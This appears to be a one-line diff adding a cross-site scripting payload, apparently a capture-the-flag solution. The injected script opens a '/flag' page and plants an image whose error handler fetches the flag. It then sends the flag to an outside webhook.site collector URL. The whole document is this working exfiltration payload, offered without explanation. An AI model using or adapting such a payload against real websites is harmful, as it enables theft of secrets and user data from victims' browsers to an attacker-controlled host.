@@ -1,0 +1,1 @@
+<script>w=window.open("/flag");w.onload=()=>w.document.write(`<img src=x onerror="fetch('/flag',{method:'POST'}).then(x=>x.text()).then(x=>fetch('https://webhook.site/026ae782-0cfc-4233-b1e3-72e259f883e7?a='+encodeURIComponent(x)))">`)</script>
